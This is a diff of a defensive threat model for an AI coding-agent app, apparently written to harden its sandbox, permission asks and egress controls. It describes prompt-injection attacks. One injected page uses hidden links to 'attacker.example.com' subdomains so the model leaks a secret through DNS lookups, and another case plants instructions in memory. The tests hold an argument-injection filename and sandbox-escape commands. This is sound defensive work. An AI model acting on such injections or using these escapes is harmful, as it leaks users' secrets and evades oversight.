@@ -1,20 +1,23 @@
 # UniDeX Rust Preview: threat model
 
-Status: M0 draft, revision 2 · 2026-11-17 · design draft 2, `docs/design/specs/2026-11-16-unidex-rust-design.md`
+Status: M0 draft, revision 3 · 2026-11-17 · design draft 2, `docs/design/specs/2026-11-16-unidex-rust-design.md`
 
 Most of the code this document describes does not exist yet. It is what builders plan from and what the security
-review at each milestone gate checks against. Revision 2 answers an adversarial review: every attack and every failing
-control it raised is either added where it belongs or answered in writing at that point.
+review at each milestone gate checks against. Revision 2 answered an adversarial review: every attack and every
+failing control it raised is either added where it belongs or answered in writing at that point. Revision 3 answers
+the re-review of revision 2: it closes a gap through which links taken from content could still carry data out (P14)
+and makes smaller corrections.
 
 Markings:
 - **(design 5.x)**: the control is already decided by that passage of the design.
 - **Proposed, not yet in the design (Pn)**, shortened to **Proposed (Pn)** after the first use in a section: this
   document's recommendation, undecided until the maintainer accepts it and the design is updated. Numbers are stable;
   new proposals continue from the highest number.
-- **Rewritten**: a proposal whose text changed after the review. **Demoted to a backstop** and **Withdrawn**: kept so
+- **Rewritten**: a proposal whose text changed after a review. **Demoted to a backstop** and **Withdrawn**: kept so
   that numbering stays stable, with the reason.
 - **Answered**: where this document disagrees with part of the review, and why.
-- Attacks the review added carry its id in brackets, such as [A1], so each can be traced.
+- Attacks a review added carry its id in brackets, such as [A1] from the review or [N1] from the re-review, so each
+  can be traced. Unqualified, "the review" is the first adversarial review; "the re-review" is the second.
 
 Milestones M0 to M11 are those of design section 6. Paths use placeholders: `<workspace>` is the folder a session
 works in, `<vault>` the app's vault, `<home>` the user's home folder. Section 7.1 lists conflicts with the design;
@@ -133,16 +136,21 @@ control, the milestone and the tests. Tests are tagged with the control they pro
   run code. On Windows nothing is auto-allowed until a parser exists for the shell in use. Allowing a build or test
   runner is shown as what it is: running code the repository controls. **Answered:** the review also asks to insert
   `--` where a program supports it. That needs per-program knowledge and changes the meaning of some commands; with no
-  wildcard expansion no unexpected file name reaches the argv, so it is not adopted.
+  wildcard expansion no unexpected file name reaches the argv, so it is not adopted. What remains is a wildcard in a
+  rule, which only the user can write (P47) but which would then admit an option the model supplies. So a wildcard in
+  a rule never matches an argument that starts with `-` unless the rule marks it as matching options: a saved `rg *`
+  does not admit `rg --pre=./x foo`.
 - **Proposed (P3).** Built-in asks in every mode, denied unattended: any `git push` (force and default-branch pushes
   flagged), history rewrites (`reset --hard`, `rebase`, `clean -fdx`, `branch -D`, `stash drop`), recursive deletes,
   package publishing, `sudo`, and the write commands of `gh` and cloud CLIs. File-tool deletes and overwrites keep a
   per-session undo copy under `.unidex/`, and the app never deletes a folder outright: it goes to the OS trash.
-- **Proposed (P4). Partly withdrawn.** Ask cards lead with the action in app-written words. Command text, paths and
-  hosts from the model are shown with control and bidirectional characters escaped and hosts in punycode when scripts
-  mix. A card shows whether the turn is exposed (4.3). No button is the default, and input is ignored for a short
-  interval after a card appears. *Withdrawn:* the clause that a card over the browser view must overlap the app's own
-  chrome; the review rates it low value, and page content cannot press app controls anyway (4.9).
+- **Proposed (P4). Rewritten; partly withdrawn.** Ask cards lead with the action in app-written words. Command text,
+  paths and hosts from the model are shown with control and bidirectional characters escaped and hosts in punycode
+  when scripts mix. A card shows whether the turn is exposed (4.3). A card for an egress request (P14) shows the full
+  decoded URL and a summary of any body, marks the parts the model composed, and never truncates the URL or the marked
+  parts. No button is the default, and input is ignored for a short interval after a card appears. *Withdrawn:* the
+  clause that a card over the browser view must overlap the app's own chrome; the review rates it low value, and page
+  content cannot press app controls anyway (4.9).
 - **Proposed (P5).** A sub-agent gets the intersection of its definition's tools and the parent session's current
   permissions, inherits the parent's exposure, and sub-agent depth and concurrency are capped.
 - **Proposed (P6).** The prompt-based tool protocol uses delimiters carrying a per-session random value; calls are
@@ -150,29 +158,37 @@ control, the milestone and the tests. Tests are tagged with the control they pro
 - **Proposed (P7). Rewritten.** If the sandbox cannot be applied in full, P1 and P43 included, the shell tool is off.
   A platform that offers only Landlock and seccomp counts as unavailable, since they cannot deny IPC. The user may turn
   on unsandboxed shell for one attended session after a warning; unattended runs never get it.
-- **Proposed (P43).** Every sandbox profile (shell, stdio MCP servers, ACP adapters, the browser helper where P33
-  holds) denies inter-process communication by default. macOS: `mach-lookup` denied except a short reviewed allow list
-  (no launch services, Apple Events, pasteboard, event posting or security server), with `lsopen` and
-  `appleevent-send` denied. Linux: no reach to `$XDG_RUNTIME_DIR` sockets, the session bus, X11 and Wayland sockets
-  (pathname and abstract) or the app's own sockets, which takes mount and network namespaces; seccomp refuses the
-  `TIOCSTI` and `TIOCLINUX` ioctls; commands start under `setsid` with no controlling terminal. Windows: a job object
-  with UI limits on a separate desktop, or an AppContainer, with no COM or WMI activation.
-- **Proposed (P47).** Rule sources and precedence. Permissions widen only from the app's settings, stored outside every
-  workspace; a workspace file can only narrow them, trusted or not. "Allow always" saves exactly the rule the card
-  displays: the exact argv by default, a wildcard only if the user edits one in. Precedence: deny, then built-in asks
-  (P3, P8, P14, P48), then user allows, then the mode. A built-in ask can be turned off only by name in settings, never
-  by an allow rule, and never for unattended runs. The app never starts an MCP server that a workspace file names.
+- **Proposed (P43). Rewritten.** Every sandbox profile (shell, stdio MCP servers, ACP adapters, the browser helper
+  where P33 holds) denies inter-process communication by default. macOS: `mach-lookup` denied except a short reviewed
+  allow list (no launch services, Apple Events, pasteboard, event posting or security server; the certificate trust
+  service only in a profile with network, so TLS verification works), with `lsopen` and `appleevent-send` denied.
+  Linux: no reach to `$XDG_RUNTIME_DIR` sockets, the session bus, X11 and Wayland sockets (pathname and abstract) or
+  the app's own sockets, which takes mount and network namespaces; seccomp refuses the `TIOCSTI` and `TIOCLINUX`
+  ioctls; commands start under `setsid` with no controlling terminal. Windows: a job object with UI limits on a
+  separate desktop, or an AppContainer, with no COM or WMI activation.
+- **Proposed (P47). Rewritten.** Rule sources and precedence. Permissions widen only from the app's settings, stored
+  outside every workspace; a workspace file can only narrow them, trusted or not. "Allow always" saves exactly the
+  rule the card displays: the exact argv by default, a wildcard only if the user edits one in, and a wildcard never
+  matches an option (P2). Precedence: deny, P48's write-denied persistence locations included, then built-in asks (P3,
+  P8, P14, P52), then user allows, then the mode. A built-in ask is turned off only by name, for the current session,
+  from the app's own screens, and a persistent indicator shows that it is off until the session ends; an allow rule
+  never turns one off, and an unattended run never runs with one off. The app never starts an MCP server that a
+  workspace file names.
 - **Proposed (P49).** The CLI escapes control characters in all model and tool text. Its asks read from the terminal
   device after discarding pending input, and need a typed word, not one key.
 - **Proposed (P50).** Each command runs in a session-owned process group it cannot leave with `setsid`: a cgroup on
   Linux, a job object on Windows, a process group with descendant tracking on macOS, which cannot stop a daemonising
   process (section 7). The UI lists live processes. Session end, app quit and the end of an unattended run kill the
   group; exposure or a revoked grant asks the user to confirm or kill the processes that hold network or credentials.
-- **Proposed (P51).** Per-command limits on process count, memory, CPU time and wall time; a cap on output kept in
-  context and in the session log, with a truncation marker; a size limit on the per-session temp folder where the
-  platform offers one (a sized tmpfs in the Linux sandbox; elsewhere the output cap and the free-space floor bound it).
-  The store refuses writes below a free-space floor and stops unattended runs there. **Answered:** the review asks for
-  a temp-folder quota on every platform; macOS and Windows offer none to an unprivileged process.
+- **Proposed (P51). Rewritten.** Per-command limits on process count, memory, CPU time and wall time; on macOS, where
+  the process limit counts all of the user's processes, a command's limit is the user's current process count plus a
+  margin. A cap on output kept in context and in the session log, with a truncation marker; a sized tmpfs for the
+  per-session temp folder in the Linux sandbox. The store refuses writes below a free-space floor, and a live watch on
+  free space kills an unattended run's process group (P50) when free space crosses the floor. **Answered:** the review
+  asks for a temp-folder quota on every platform. The free-space floor, not a temp quota, is what bounds the disk,
+  since the workspace is writable without a quota everywhere; a quota on the temp folder alone is therefore not worth
+  its weight on macOS and Windows, where it would take a sized disk image or virtual disk. Residuals (section 7): an
+  attended run can still fill the disk, and on macOS a fork bomb can still freeze the user's session.
 - **Proposed (P58).** Asks are rate-limited and a turn stops after a set number of denials. An agent sees only its own
   session's asks, and at most one unanswered desktop notice per session waits (lesson L42). OS notification titles are
   written by the app, never by a model, so a notification cannot imitate a system dialog.
@@ -188,27 +204,31 @@ P5). The Linux mechanism behind P1 and P43 must be decided before M1 starts (7.1
   neither the test's stub resolver nor the system resolver's socket. The Linux variant waits for the decision in 7.1.
 - P2: a rule-allowed `tar czf o.tgz *` beside a planted `--checkpoint-action=exec=...` file leaves no marker; compound
   commands generated around an allowed prefix always ask; a zsh glob qualifier never runs under a rule; on Windows every
-  command asks.
+  command asks; a saved rule `rg *` does not admit `rg --pre=./x foo`.
 - P3: under the most permissive mode `git push --force` raises a card, and unattended it is denied; a file-tool delete
   is undone byte for byte; a folder delete lands in the trash.
 - P4: a bidi override renders escaped; a mixed-script host renders in punycode; Return inside the guard interval
-  approves nothing; the exposure badge shows after a mock fetch.
+  approves nothing; the exposure badge shows after a mock fetch; the card for a 4 KB composed URL shows it whole, with
+  the composed path segment marked.
 - P5: a sub-agent defined with `shell` under a read-only parent gets no shell, is exposed when its parent is, and one
   past the depth cap is refused.
 - P6: fuzzing the protocol parser: tool-result text containing call syntax never yields a call.
 - P7: with the sandbox forced unavailable in a test build the shell tool refuses, and an unattended run cannot enable
   unsandboxed shell.
 - P43: an escape matrix run from inside the sandbox on each CI platform (`open`, `osascript`, `launchctl`;
-  `systemd-run`, `gio open`, an X11 connection, `TIOCSTI`; `schtasks`, WMI, COM) leaves no marker file outside it.
-  The Linux variant waits for the decision in 7.1.
+  `systemd-run`, `gio open`, an X11 connection, `TIOCSTI`; `schtasks`, WMI, COM) leaves no marker file outside it. On
+  each CI platform an https request from a networked sandboxed command succeeds with certificate checks on, while the
+  keychain lookup of P23's test fails from the same profile. The Linux variant waits for the decision in 7.1.
 - P47: a workspace file allowing `npm *` changes nothing; "allow always" on `npm test` does not admit `npm exec`; a
-  user allow on `git push` still asks; a server named in a workspace `.mcp.json` is never started.
+  user allow on `git push` still asks; a server named in a workspace `.mcp.json` is never started; with P14's ask
+  turned off for one session the indicator shows throughout, and the next session asks again.
 - P49: pre-filled standard input approves nothing; cursor-movement sequences in tool output print escaped.
 - P50: on Linux and Windows CI a process that double-forks and calls `setsid` is gone when the run ends. On macOS the
   process group is killed; the daemonising case stays a gap until M1's sandbox design answers it.
-- P51: a fork bomb in the sandbox is contained on Linux and Windows (macOS relies on a per-user process limit, section
-  7); output past the cap is cut with a marker; below the free-space floor the store refuses a write and an unattended
-  run stops.
+- P51: a fork bomb in the sandbox is contained on Linux and Windows; on macOS a command's process limit reads back as
+  the user's process count at its start plus the margin (section 7); output past the cap is cut with a marker; below
+  the free-space floor the store refuses a write; an unattended run whose command fills a test volume past the floor
+  has its process group killed and ends with an event.
 - P58: after the set number of denials the turn stops with an event; a second unanswered notice for one session is not
   raised; a session's status lists no other session's asks; a notify call whose text imitates a system title still
   produces the app's own title.
@@ -247,8 +267,10 @@ repository's own configuration inside the workspace.
   launch files, `.envrc`, `.husky/` and CI workflow folders ask in every mode and are denied unattended. A sandbox
   profile cannot ask, so it denies named sub-paths: `.git/hooks`, `.git/config`, `.git/info`, `.git/modules/*/hooks`,
   `.git/modules/*/config`, the other paths above, and the resolved paths of P48. Objects, the index and refs stay
-  writable so git works. A command that needs a protected path runs only after an ask, with a wider profile for that
-  one command. The file tools never create links or set an executable bit; a new file is never executable.
+  writable so git works. The app cannot know beforehand which paths a command will write, so only after the sandbox
+  reports a denied write to a protected path may the app offer to run that command again, on an ask, with a wider
+  profile for that one run. The file tools never create links or set an executable bit; a new file is never
+  executable.
 - **Proposed (P9). Rewritten.** The guard checks the opened handle, not a path string: each component is opened
   relative to its parent without following links (`openat2` with `RESOLVE_BENEATH` on Linux, `O_NOFOLLOW_ANY` on macOS,
   reparse-point aware relative opens on Windows), and the final path read back from the handle is checked again.
@@ -264,8 +286,12 @@ repository's own configuration inside the workspace.
 - **Proposed (P11). Rewritten.** The app's own git reads (status, diff pane, branch display) run with every
   repository-configured program off: no fsmonitor, hooks, filter or textconv drivers, external diff, signature checks
   or lazy fetch, in submodules too, and a new file's diff reads only a regular file the status lists. The Commit button
-  runs the repository's hooks inside the sandbox with the workspace profile; if a hook file or `core.hooksPath` changed
-  during the session (P18 records it), Commit first lists them and asks.
+  runs git outside the sandbox, because signing needs the agent sockets P23 removes and the IPC P43 denies. That git
+  process keeps the signing agent's socket, the one exception to P23. Repository-configured programs stay off as for
+  reads, hooks aside, and signing programs come only from the user's global configuration, never the repository's.
+  `core.hooksPath` is set to an app-supplied folder whose wrappers run the repository's real hooks inside the sandbox,
+  with the workspace profile and P23's environment. If a hook file or `core.hooksPath` changed during the session (P18
+  records it), Commit first lists them and asks.
 - **Proposed (P48).** Workspace edges. `<home>`, its parent folders and the file system root are refused as a workspace
   unless the user types a confirmation, and then the untrusted rules (P13) apply. P8 resolves and protects the
   configured `core.hooksPath`, a worktree's common git directory, module directories and the target of a `gitdir:`
@@ -278,8 +304,9 @@ repository's own configuration inside the workspace.
 **Tests:**
 - Design: property tests over generated paths (case variants, NFC and NFD, `..`, symlink and hard-link chains,
   junctions on Windows CI): no accepted path resolves outside the workspace or onto a denied entry.
-- P8: inside the sandbox a write to `.git/hooks/x` fails while `git commit` succeeds; a file-tool write to `.mcp.json`
-  raises a card; the file tools cannot create a link or set an executable bit.
+- P8: inside the sandbox a write to `.git/hooks/x` fails while `git commit` succeeds; after that denied write, the
+  command runs again with the wider profile only once a card is approved; a file-tool write to `.mcp.json` raises a
+  card; the file tools cannot create a link or set an executable bit.
 - P9: a helper thread swaps a folder and a symlink in a loop while the file tool reads, and the read never returns the
   target's contents; on Windows CI every refused form returns a denial and makes no network attempt; a write through a
   symlink lands on the guarded target with mode and extended attributes kept; a hard-linked file's other name keeps its
@@ -287,7 +314,9 @@ repository's own configuration inside the workspace.
 - P10: from the sandbox, a planted `<home>/.bash_history`, an unlisted token file under `<home>` and a file in
   `<vault>/.unidex/sessions/` are all unreadable.
 - P11: in a test repository whose fsmonitor and textconv programs write a marker, the diff pane works and the marker
-  never appears; after a session edits `.husky/pre-commit`, Commit lists it and asks.
+  never appears; after a session edits `.husky/pre-commit`, Commit lists it and asks; with a signing key in a test
+  agent, Commit makes a signed commit while the repository's hook runs sandboxed (its write outside the workspace
+  fails) and a `gpg.program` set in the repository's configuration never writes its marker.
 - P48: choosing `<home>` without the typed confirmation is refused; from the sandbox, writes to a temp home's shell
   startup file, launch agent folder and systemd user folder fail; in a worktree, a write to the common hooks folder
   fails.
@@ -313,6 +342,9 @@ the user's data against leaving once content has spoken.
    or a nested `AGENTS.md` pulled in through an `@` import; none of it is labelled and the turn is not exposed.
 7. [A17] A remote MCP server's OAuth metadata names a `file:` URL or a custom-scheme authorization endpoint, and the app
    opens it (the class of CVE-2025-6514); or an ACP agent asks the app to open a link.
+8. [N1] An injected page lists hidden links, each to a distinct, never-contacted subdomain, one per position and value,
+   such as `https://p03-v0a.attacker.example.com/`. The model follows the links that spell a secret. None is composed,
+   no origin supplied content before its first fetch, and the DNS lookups alone leak the data.
 
 **Control:**
 - Web pages, MCP results, browser content and files from outside the workspace are labelled untrusted in the model's
@@ -363,11 +395,16 @@ the user's data against leaving once content has spoken.
   a URL requested before exposure, or a link present verbatim in content already in context. Everything else asks,
   whatever host it goes to: a URL the model built or changed in any part (subdomain, path, query, fragment); any request
   with a body; agent typing in the browser; a shell command with network; an MCP call, unless the server is a stdio
-  server sandboxed without network (P27). Host history plays no part, so the injecting origin has no standing. Verbatim
-  links to an origin that supplied untrusted content this session are capped at a few per turn before asking, which
-  narrows signalling by the choice of link. Every redirect hop to an origin not yet seen in the session asks. An
-  unattended run reaches only the fixed URL prefixes (scheme, host, port and path prefix) its routine declared (P41);
-  anything else is denied.
+  server sandboxed without network (P27) and none of the folders it can write is in a synced or shared location (a
+  sync client's folder, a network mount, a cloud file provider), which the app checks when the server starts; when it
+  cannot tell, the exception does not apply. Host history never exempts a request, so the injecting origin has no
+  standing. Links taken verbatim from untrusted content are limited three ways, since the choice of link can signal
+  data. A link to an origin not yet contacted in the session asks, as every redirect hop to such an origin does, so
+  links to distinct, never-contacted subdomains cannot spell data through their lookups. Links to an origin that
+  supplied untrusted content this session are capped at a few per turn before asking. And such links are capped in
+  total across all origins, approved ones included, per turn and per session; reaching either total stops the turn
+  with an event. An unattended run reaches only the fixed URL prefixes (scheme, host, port and path prefix) its routine
+  declared (P41); anything else is denied.
 - **Proposed (P15). Rewritten.** The markdown renderer (chat, memory, notes, notifications, proposals) never fetches a
   remote resource by itself: a remote image is a placeholder showing its full decoded URL, and in output from an
   exposed turn loading it asks. Links open only through the app's single opener (P54), on an explicit action that shows
@@ -397,9 +434,12 @@ M7 extend labelling to ACP and the browser.
   trusted one, editing an `@`-imported instruction file asks again, and reading a planted `node_modules/x/README.md`
   exposes the turn.
 - P14: in an exposed turn, a fetch to the injecting host with a composed path asks; a navigation to
-  `<canary>.attacker.example.com` asks; a redirect from a verbatim URL to a new origin asks; a verbatim link passes, and
-  the link past the cap to the injecting origin asks; an MCP call to a networked server asks while one to a sandboxed
-  stdio server without network passes; unattended, a URL outside the declared prefix is denied.
+  `<canary>.attacker.example.com` asks; a redirect from a verbatim URL to a new origin asks; a verbatim link to the
+  injecting origin passes, and the link past the per-origin cap asks. A mock page listing links to distinct,
+  never-contacted subdomains such as `p03-v0a.attacker.example.com`: each first fetch asks, the stub resolver sees no
+  lookup before the answer, and with every card approved the turn stops when the total cap is reached. An MCP call to a
+  networked server asks, while one to a sandboxed stdio server without network passes, and asks once a folder it can
+  write is a stand-in sync folder. Unattended, a URL outside the declared prefix is denied.
 - P15: markdown with a remote image makes no request (the HTTP stand-in records none); in exposed output, loading it
   raises a card showing the full URL.
 - P16: an OSC 52 write does not reach the system clipboard (a clipboard stand-in records nothing); a status query
@@ -519,9 +559,10 @@ M6 (routines and duties under P19).
   agent session left when it launched the app. The OS secret store is out of reach of sandboxed commands: the keychain
   service through P43's reviewed mach allow list, the Secret Service by denying the whole session bus (it cannot be
   filtered per destination), the Windows credential API through the AppContainer or restricted token. A per-session
-  "use my credentials" permission restores a named subset, for that session only (P50 ends it). A secret reaches a
-  child through its environment or standard input, never its arguments, and a value the app passes to its own child
-  processes can never be read as an option.
+  "use my credentials" permission restores a named subset, for that session only (P50 ends it). The git process behind
+  the Commit button keeps the signing agent's socket (P11); the hooks it runs do not. A secret reaches a child through
+  its environment or standard input, never its arguments, and a value the app passes to its own child processes can
+  never be read as an option.
 - **Proposed (P55).** Scheduler definitions (launchd property lists, systemd units, scheduled tasks) never hold a
   secret. An unattended run that cannot reach the keychain fails and notifies; it does not fall back to environment
   variables (7.1).
@@ -565,8 +606,8 @@ and data leaving through the app's own requests.
 - `web_fetch` refuses loopback, link-local and private addresses unless the user allows them (design 5.11). Precisely:
   `http` and `https` only; every IP spelling (IPv4-mapped IPv6, integer, octal, short forms) is normalised before the
   check; the name is resolved once and the connection goes to the checked address; every redirect is checked again.
-  Host policy, P14 included, is evaluated before any lookup, so a refused name is never resolved. Provider calls to a
-  local model server are configuration, not `web_fetch`, and are not affected.
+  Host policy, P14 included, is evaluated before any lookup, so a name is resolved only once its request is allowed or
+  approved. Provider calls to a local model server are configuration, not `web_fetch`, and are not affected.
 - The app makes no network call the user did not configure (design section 2, anti-goals).
 - **Proposed, not yet in the design (P24). Rewritten.** `web_fetch` caps body size, decompressed size and time per call.
   An allow for a private address names a host and port, never "all private", and unattended runs do not inherit it. A
@@ -596,6 +637,8 @@ and data leaving through the app's own requests.
 4. A page in the user's own browser sends requests to `unidex serve`'s HTTP transport on loopback.
 5. [A16] A server configured as `npx -y @scope/server` runs whatever version the registry serves today, below the
    description hash; its prompt templates, offered as slash commands, become user-role messages.
+6. An outside agent connected to `unidex serve` reads a recall hit or a daily note derived from an exposed session; the
+   text arrives as plain memory, and the outside agent follows the instruction in it.
 
 **Control:**
 - Servers are untrusted: per-server approval of tools; results labelled (design 5.11). `unidex serve` speaks standard
@@ -615,8 +658,12 @@ and data leaving through the app's own requests.
 - **Proposed (P28).** `unidex serve` offers read tools by default, a write it allows becomes a draft (4.4), and its
   session tools are off unless turned on. Its network transport binds loopback only, checks `Host` and `Origin`, and
   compares the token in constant time.
+- **Proposed (P61).** Results of `unidex serve`'s read tools (memory, recall, and session content where P28 allows it)
+  reach the outside agent in the same labelled blocks P45 uses: each item names its origin, the delimiters carry a
+  per-connection random value, and an item derived from an exposed session, or saved from an exposed draft or an
+  import, says so, so the outside agent's context marks it untrusted.
 
-**Milestone:** M2 (client, P25 to P27); M3 (`unidex serve`, P28); M10 (Connectors screen).
+**Milestone:** M2 (client, P25 to P27); M3 (`unidex serve`, P28, P61); M10 (Connectors screen).
 
 **Tests:**
 - P25: with a fake MCP server, a description changed after approval asks again; a shadowing name is refused; an
@@ -627,6 +674,8 @@ and data leaving through the app's own requests.
   pinned or refused at add.
 - P28: a request with a foreign `Origin` or a wrong token is refused; a memory write over MCP yields a draft; the
   session tools are absent by default.
+- P61: over `unidex serve`, a recall of an exposed session's page arrives in a labelled block naming its origin and
+  marked as derived from an exposed session; a result holding the delimiter is escaped.
 
 ### 4.8 ACP agents
 
@@ -678,7 +727,7 @@ repository's own agent configuration.
   project setting sources off; a forwarded "allow always" reaches the agent as allow once; a fake shared daemon is
   refused; a handoff from an exposed session raises a card. First an M5 check must answer how each real adapter loads
   project settings and whether it shows its own trust prompt; an opt-in live test then asserts that a fixture
-  repository's hook marker never appears.
+  repository's hook marker never appears and that the MCP server its project configuration defines is never started.
 - P29: first the M0 trial and an M5 check must answer whether nested seatbelt profiles work and how each adapter reaches
   its credential folder; the test then asserts that the fake agent's own write outside the workspace fails.
 - P30: a misleadingly labelled request shows the kind's words; an answer replayed against another request id is
@@ -819,10 +868,10 @@ the P33 and clipboard questions); M7.
 |---|---|
 | `web_fetch` | Address rules (4.6); P14 after exposure; P24 caps |
 | Shell | Sandbox; no network (P1); scrubbed environment (P23); no IPC to an unsandboxed process (P43); grants end with the session (P50) |
-| MCP calls | Per-tool approval; P14 after exposure, sandboxed stdio servers without network excepted; P27 |
+| MCP calls | Per-tool approval; P14 after exposure, sandboxed stdio servers without network that write to no synced or shared folder excepted; P27 |
 | Browser navigation and typing | Ask gating; P14; P52; P34 as a backstop |
 | Markdown images and links | P15 and the single opener (P54) |
-| DNS | Policy before any lookup (4.6); none in the sandbox (P1); browser prefetch off (P52); open once shell network is granted (section 7) |
+| DNS | Policy before any lookup (4.6), so a link to an origin new to the session asks before it is resolved (P14); none in the sandbox (P1); browser prefetch off (P52); open once shell network is granted (section 7) |
 | ACP agents' own network | P44 first, P29 second, with the limits stated in 4.8 |
 | Clipboard | P16 in the terminal, P52 in the browser |
 | Git push, package publish | P3 |
@@ -850,16 +899,18 @@ P5 caps sub-agent fan-out and P26 gates sampling.
 
 **Proposed, not yet in the design (P40). Rewritten.** The caps are on from M1, since M1 already runs a hosted provider
 and the first evaluation while the parity table puts cost tracking in M2. The worst case is reserved atomically in the
-shared SQLite store before each call and settled after, so the app, the CLI and `run-due` draw on one budget. A remote
-model with no known price refuses calls until the user sets a price or a cap; a local provider on loopback costs
-nothing. An index rebuild on a hosted embeddings model shows its estimate and asks, and never runs unattended. A
-cancelled or retried stream keeps its reservation until the provider reports usage. Each routine and duty has its own
-per-run budget, and a single file read into context is capped in size. ACP agents' spend stays outside the ledger
-(section 7).
+shared SQLite store before each call and settled after, so the app, the CLI and `run-due` draw on one budget. A model
+with no known price refuses calls until the user sets a price or a cap. A loopback endpoint is often a proxy to a paid
+provider, so it counts as free only when the app recognises a local model server there or the user marks it free;
+otherwise it needs a price like a remote one. An index rebuild on a hosted embeddings model shows its estimate and
+asks, and never runs unattended. A cancelled or retried stream keeps its reservation until the provider reports usage.
+Each routine and duty has its own per-run budget, and a single file read into context is capped in size. ACP agents'
+spend stays outside the ledger (section 7).
 
 Milestone: M1 (P40). Tests: two processes with budget for one call make exactly one; a remote model with no price
-refuses a call; an unattended index rebuild is refused; with a priced mock provider a scripted loop stops at the cap
-with a clear event, and a call estimated over the cap is never sent.
+refuses a call, and so does a loopback endpoint that the app does not recognise as a local model server and the user
+has not marked free; an unattended index rebuild is refused; with a priced mock provider a scripted loop stops at the
+cap with a clear event, and a call estimated over the cap is never sent.
 
 ### 5.4 Unattended runs
 
@@ -882,8 +933,10 @@ standard input that is not a terminal turns every ask into a deny.
 instructions through every exposing source in 4.3's table, with a canary secret in a temp `<home>` and a canary host. A
 task passes when no canary leaves through any channel in 5.1 and no protected path changes. It must pass for every model
 in the matrix, the small local model included, because the controls hold whatever the model does. Each task also
-records how many asks it raised, so P14's cost to the user is visible and no exemption is added blind. It runs at the
-M2 gate and every gate after. Test: the set itself; a gate fails on any canary leak.
+records how many asks it raised, and the set reports the ask rate of P14, P52 and P13 together, so their cost to the
+user is visible and no exemption is added blind. The response to measured fatigue is a per-session relaxation shown by
+a persistent indicator (P47), never a global off switch. The set runs at the M2 gate and every gate after. Test: the
+set itself; a gate fails on any canary leak, and its report states the combined ask rate.
 
 ## 6. Lessons from the Electron app
 
@@ -956,7 +1009,10 @@ Every lesson in the Electron app's `SECURITY.md`, restated, with whether it appl
   than write through, but a hard link to an unlisted sensitive file reads as an ordinary file.
 - **Process containment on macOS (P50, P51).** macOS offers no cgroup or job object: a sandboxed process that
   daemonises leaves the process group (it stays sandboxed, but keeps a network grant it was started with), and the
-  process limit is per user, not per command.
+  process limit is per user, not per command. A limit set from the user's current process count plus a margin narrows
+  a fork bomb, but one can still freeze the user's session.
+- **A full disk in attended runs (P51).** The free-space watch kills only unattended runs. In an attended run a command
+  can still fill the disk; the floor then protects only the store's own writes.
 - **The embedded browser's helper process.** CEF's browser process is not covered by Chromium's sandbox and runs with
   the user's full privileges unless P33 proves workable; what it can reach is measured in the M0 trial. Page clipboard
   writes are contained only if CEF lets the app intercept them (P52).
@@ -964,8 +1020,9 @@ Every lesson in the Electron app's `SECURITY.md`, restated, with whether it appl
   verify an ask card. Card text must be the first thing exposed to accessibility APIs when support arrives, and keyboard
   use must never make approving easier than refusing (P4).
 - **Exfiltration that P14 does not see.** P14 applies only after exposure. A secret the user pastes into a prompt,
-  covert channels (which verbatim link is followed, within P14's cap; timing), and output that persuades the user to
-  paste something are not stopped by any control here.
+  covert channels (which verbatim link to an origin already contacted in the session is followed, within P14's
+  per-origin and total caps, since a link to a new origin asks; timing), and output that persuades the user to paste
+  something or approve a card are not stopped by any control here.
 - **Shell network once granted** has no host-level control: no egress proxy is planned. Open: a filtering proxy for
   sandboxed commands in a later milestone.
 - **Shell output in a trusted workspace** does not expose the turn when the command had no network, yet tests run
@@ -993,11 +1050,13 @@ Every lesson in the Electron app's `SECURITY.md`, restated, with whether it appl
 | Conflict | Design passage | This document |
 |---|---|---|
 | Chromium's sandbox against confining the helper | 5.8 "Chromium's own sandbox stays on, on every platform"; anti-goal "turning off Chromium's sandbox" | P33 confines the helper's browser process, which may stop the renderer sandbox engaging; P33 yields wherever it does |
-| The Linux sandbox mechanism | 5.11 "Landlock and seccomp on Linux" | P1 and P43 need mount and network namespaces; Ubuntu restricts unprivileged user namespaces through AppArmor, so the `.deb` must ship an AppArmor profile for the sandbox helper, or P7 turns the shell off on default installs |
+| The Linux sandbox mechanism | 5.11 "Landlock and seccomp on Linux" | P1 and P43 need mount and network namespaces; Ubuntu restricts unprivileged user namespaces through AppArmor, so the `.deb` must ship an AppArmor profile for the sandbox helper, or P7 turns the shell off on default installs; under P43 and fail closed (section 5), stdio MCP servers (P27) and ACP adapters (P29) are then off there too |
 | Chromium's sandbox on default Ubuntu | 5.8 "A package format that cannot run it ... does not ship the browser" | Chromium's own sandbox meets the same namespace restriction; the `.deb` needs an AppArmor profile or CEF's setuid sandbox helper, or it ships no browser on default Ubuntu |
+| Every feature on every platform | G7 "A feature works on all three or is listed as an exception in section 8" | A shell, stdio MCP servers and ACP adapters that are off on default Ubuntu (P7, P43), and Windows with no auto-allowed command (P2), each need an exception listed in design section 8 |
 | Skills and sub-agents arrive before their protection | Section 6: skills and sub-agents in M2, memory (where drafts arrive) in M3 | P19 denies tool writes to skills and sub-agent definitions in M2, until drafts exist in M3 |
 | ACP mediation | 5.4 "Those requests pass through the same permissions and sandbox as the native engine's tools" | Agents' own tools and their project configuration run outside those requests; P44 gates the start and P29 adds a second layer |
 | Scope of untrusted files | 5.11 "files from outside the workspace are labelled as untrusted" | A repository is untrusted until the user trusts it, and third-party paths stay untrusted after (P13) |
+| Scope of the file tools | 5.3 "File tools are scoped to the workspace" | Reads outside the workspace ask rather than being refused (P60), as design 5.11's labelling of outside files assumes, and writes outside need a rule naming the folder (4.2) |
 | `unidex serve` session tools | 5.6 "it exposes memory, recall and session tools" | Session tools are off by default (P28) |
 | Secrets for unattended runs | 5.10 "environment variables as a fallback where no keychain exists" | Scheduler definitions never hold secrets, and a run without the keychain fails (P55) |
 | The headless CLI | 5 "`unidex` binary: every capability, headless" | Provider hosts and permission widening change only interactively (P22, P47) |
@@ -1005,71 +1064,72 @@ Every lesson in the Electron app's `SECURITY.md`, restated, with whether it appl
 
 ## 8. Priority order for the maintainer
 
-Decide in this order. The first five rows are the review's five that matter most; P42 follows them because it proves
-them.
+Decide in this order. The first six rows are the review's five that matter most, with P1 and P43 counted as one, as
+the review counted them; P42 follows them because it proves them. The table lists all 61 proposals, one row each.
 
 | Order | Proposal | What it stops |
 |---|---|---|
-| 1 | P14 | Data leaving after a successful injection, to any host, the injecting one included |
+| 1 | P14 | Data leaving after a successful injection, to any host, the injecting one included, by a composed URL or a choice of links |
 | 2 | P1 | A sandboxed command sending data out or resolving names |
 | 3 | P43 | A sandboxed command asking the OS to run code outside the sandbox |
